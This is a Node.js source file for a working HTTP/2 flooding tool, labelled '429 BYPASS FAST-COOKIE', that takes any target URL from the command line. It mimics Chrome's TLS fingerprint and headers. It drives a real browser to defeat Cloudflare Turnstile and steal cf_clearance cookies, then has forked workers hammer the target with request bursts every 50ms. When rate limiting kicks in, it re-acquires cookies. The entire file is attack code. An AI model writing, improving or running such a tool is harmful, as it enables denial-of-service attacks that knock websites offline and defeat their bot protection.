const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const EventEmitter = require('events');

EventEmitter.defaultMaxListeners = 0;

const MAX_CONCURRENT_STREAMS_PER_WORKER = 200;

// ── Chrome 133 matching TLS ciphers (JA3 fingerprint) ────────────────────────
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA"
].join(":");

// ── Chrome 133 exact sigalgs ──────────────────────────────────────────────────
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");

if (process.argv.length < 6) {
    console.log("\x1b[31m======[ 429 BYPASS FAST-COOKIE ]======\x1b[0m");
    console.log("\x1b[31mUsage: node browser-like-fast <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node browser-like-fast https://target.com 60 64 4 2\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2
};

let consecutive429 = 0;

// ── Data pools ────────────────────────────────────────────────────────────────
const LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,fr;q=0.7",
    "en-US,en;q=0.9,de;q=0.8",
    "en-GB,en;q=0.8"
];

const FETCH_SITES = ["none", "same-origin", "cross-site"];

// ── Main flood function (aggressive, minimal delay) ───────────────────────────
function flood(userAgent, cookie) {
    try {
        const parsed = url.parse(args.target);
        const host = parsed.hostname || parsed.host;
        const path = parsed.path || '/';

        function getChromeVersion(ua) {
            const m = ua.match(/Chrome\/([\d.]+)/);
            return m ? m[1] : "133.0.0.0";
        }

        const chromever = getChromeVersion(userAgent);
        const chromeVersion = chromever.split('.')[0];
        const randValue = list => list[Math.floor(Math.random() * list.length)];

        const referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://yandex.com/",
            args.target,
            "https://duckduckgo.com/?q=" + encodeURIComponent(host)
        ];

        // Build per-request headers
        function buildHeaders() {
            const headers = {
                ":method": "GET",
                ":authority": parsed.host,
                ":scheme": "https",
                ":path": path,
                "sec-ch-ua": `"Not(A:Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-ch-ua-platform-version": "\"15.0.0\"",
                "sec-ch-ua-model": "\"\"",
                "sec-ch-ua-arch": "\"x86\"",
                "sec-ch-ua-bitness": "\"64\"",
                "sec-ch-ua-full-version-list": `"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="${chromever}", "Chromium";v="${chromever}"`,
                "upgrade-insecure-requests": "1",
                "user-agent": userAgent,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "sec-fetch-site": randValue(FETCH_SITES),
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "referer": randValue(referers),
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": randValue(LANGS),
                "priority": "u=0, i",
                "te": "trailers",
                "pragma": "no-cache",
                "cache-control": "no-cache"
            };
            if (cookie) headers["cookie"] = cookie;
            return headers;
        }

        // ── TLS socket with Chrome-matching fingerprint ───────────────────────
        const tlsSocket = tls.connect({
            host: host,
            port: 443,
            servername: host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ALPNProtocols: ["h2", "h3", "h3-29", "http/1.1"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            ecdhCurve: "X25519:P-256:P-384:P-521",
            secureOptions:
                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1,
            rejectUnauthorized: false
        });

        tlsSocket.on("error", () => {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests = (global.totalRequests || 0) + 1;
            if (!tlsSocket.destroyed) tlsSocket.destroy();
            // Fast reconnect — no delay
            setImmediate(() => flood(userAgent, cookie));
        });

        // ── HTTP/2 session over TLS socket ────────────────────────────────────
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxConcurrentStreams: 1000,
                maxFrameSize: 16384,
                maxHeaderListSize: 262144
            }
        });

        client.on("connect", () => {
            function sendRequests() {
                if (client.destroyed || client.closed) return;

                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(buildHeaders());

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;

                        const status = res[":status"];
                        if (status === 429 || status === 503) {
                            consecutive429++;
                            // Trigger cookie refresh on worker
                            if (process.send) {
                                process.send({ type: 'needRefresh' });
                            }
                            client.close();
                        }
                    });

                    request.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                    });

                    request.end();
                }

                // Aggressive: minimal delay between bursts (50ms instead of 500-2000ms)
                setTimeout(sendRequests, 50);
            }
            sendRequests();
        });

        client.on("close", () => {
            if (!client.destroyed) client.destroy();
            setImmediate(() => flood(userAgent, cookie));
        });

        client.on("error", () => {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests = (global.totalRequests || 0) + 1;
            if (!client.destroyed) client.destroy();
            setImmediate(() => flood(userAgent, cookie));
        });

        client.setTimeout(15000, () => {
            if (!client.destroyed) client.destroy();
        });

    } catch (err) {
        setImmediate(() => flood(userAgent, cookie));
    }
}

// ── Fast Cloudflare Bypass — single attempt with tight timeout ────────────────
async function bypassCloudflareOnce(attemptNum) {
    let browser = null;
    let page = null;

    try {
        console.log("\x1b[33m[CF FAST] Attempt " + attemptNum + "...\x1b[0m");

        const response = await connect({
            headless: false,
            turnstile: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--enable-quic',
                '--quic-version=h3',
                '--origin-to-force-quic-on=' + url.parse(args.target).host + ':443'
            ],
            customConfig: {},
            connectOption: { defaultViewport: null },
            disableXvfb: false
        });

        if (!response || !response.browser) throw new Error("Failed to launch browser");

        browser = response.browser;
        page = response.page;

        console.log("\x1b[33m[CF FAST] Navigating to " + args.target + "...\x1b[0m");
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });

        // ── Fast poll: check every 500ms instead of 1000ms, max 30s ─────────
        let cfClearance = null;
        const POLL_INTERVAL = 500;
        const MAX_POLLS = 60; // 30 seconds

        for (let i = 0; i < MAX_POLLS; i++) {
            await new Promise(r => setTimeout(r, POLL_INTERVAL));

            // Lightweight mouse jitter to appear human
            try {
                const x = 100 + Math.random() * 400;
                const y = 100 + Math.random() * 300;
                await page.mouse.move(x, y);
            } catch (e) { }

            // Try to click Turnstile checkbox if visible
            try {
                const iframe = page.frames().find(f => f.url().includes('cloudflare'));
                if (iframe) {
                    const cb = await iframe.$('.cb-c');
                    if (cb) await cb.click();
                }
            } catch (e) { }

            const cookies = await page.cookies();
            cfClearance = cookies.find(c => c.name === "cf_clearance");
            if (cfClearance) break; // Cookie acquired — exit immediately
        }

        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);

        if (browser) { try { await browser.close(); } catch (e) { } }

        if (cfClearance) {
            console.log("\x1b[32m[CF FAST] Got cf_clearance in attempt " + attemptNum + "\x1b[0m");
            return { cookies, userAgent, success: true };
        } else {
            console.log("\x1b[31m[CF FAST] No cf_clearance in attempt " + attemptNum + "\x1b[0m");
            return { cookies: [], userAgent, success: false };
        }

    } catch (error) {
        console.log("\x1b[31m[CF FAST] Error: " + error.message + "\x1b[0m");
        if (browser) { try { await browser.close(); } catch (e) { } }
        return { success: false };
    }
}

// ── KEY CHANGE: Parallel bypass — all cookies acquired simultaneously ─────────
async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35m429 BYPASS FAST-COOKIE - PARALLEL\x1b[0m");
    console.log("\x1b[33mLaunching " + totalCount + " bypass instances in parallel...\x1b[0m");

    // All instances start at the same time (Promise.all instead of sequential loop)
    const promises = Array.from({ length: totalCount }, (_, i) =>
        bypassCloudflareOnce(i + 1)
    );

    const results = await Promise.allSettled(promises);
    const successful = results
        .filter(r => r.status === 'fulfilled' && r.value.success)
        .map(r => r.value);

    if (successful.length === 0) {
        console.log("\x1b[31mAll bypasses failed. Using fallback UA.\x1b[0m");
        successful.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            success: true
        });
    }

    console.log("\x1b[32mParallel bypass complete: " + successful.length + "/" + totalCount + " succeeded\x1b[0m");
    return successful;
}

// ── Cookie refresh: re-run bypass and update global pool ─────────────────────
let isRefreshing = false;
async function refreshCookies() {
    if (isRefreshing) return;
    isRefreshing = true;
    console.log("\x1b[33m[REFRESH] Re-acquiring cookies in parallel...\x1b[0m");
    try {
        const fresh = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = fresh;
        // Broadcast fresh cookies to all workers
        for (const id in cluster.workers) {
            cluster.workers[id].send({ type: 'bypassData', data: fresh });
        }
        console.log("\x1b[32m[REFRESH] Cookies refreshed successfully.\x1b[0m");
    } catch (e) { }
    isRefreshing = false;
}

function runFlooder() {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies
        ? bypassInfo.cookies.map(c => c.name + "=" + c.value).join("; ")
        : "";
    const userAgent = bypassInfo.userAgent ||
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36";

    flood(userAgent, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const proto = url.parse(args.target).protocol === 'https:' ? 'HTTP/2 (TLS h2/h3 ALPN)' : 'HTTP/2';
    console.clear();
    console.log("\x1b[31m======[ 429 BYPASS FAST-COOKIE ]======\x1b[0m");
    console.log("\x1b[36mTarget:\x1b[0m      " + args.target);
    console.log("\x1b[36mTime:\x1b[0m        " + elapsed + "s / " + args.time + "s");
    console.log("\x1b[36mRate:\x1b[0m        " + args.Rate + " req/burst | " + args.threads + " workers");
    console.log("\x1b[36mProtocol:\x1b[0m    " + proto);
    console.log("\x1b[36mCookies:\x1b[0m     " + (global.bypassData ? global.bypassData.length : 0) + " sessions active");
    console.log("\x1b[36mTotal:\x1b[0m       " + (global.totalRequests || 0) +
        " | \x1b[32mOK:\x1b[0m " + (global.successRequests || 0) +
        " | \x1b[31mErr:\x1b[0m " + (global.failedRequests || 0));
    console.log("\x1b[36m429 Count:\x1b[0m   " + consecutive429);
}

global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m429 BYPASS FAST-COOKIE - PARALLEL MODE\x1b[0m");

    (async () => {
        // All cookies acquired in parallel from the start
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;

        console.log("\n\x1b[32mGot " + bypassResults.length + " sessions (parallel). Forking " + args.threads + " workers...\x1b[0m");
        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults });
        }

        const statsInterval = setInterval(displayStats, 1000);

        // Listen for refresh requests from workers (triggered by 429/503)
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests   += message.total   || 0;
                global.successRequests += message.success || 0;
                global.failedRequests  += message.failed  || 0;
            }
            if (message.type === 'needRefresh') {
                refreshCookies();
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\x1b[32mAttack completed.\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();

} else {
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;

            for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                // Faster stagger: 20ms instead of 50ms
                setTimeout(() => runFlooder(), i * 20);
            }

            setInterval(() => {
                process.send({
                    type: 'stats',
                    total:   global.totalRequests   || 0,
                    success: global.successRequests || 0,
                    failed:  global.failedRequests  || 0
                });
                global.totalRequests   = 0;
                global.successRequests = 0;
                global.failedRequests  = 0;
            }, 1000);
        }
    });
}

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });
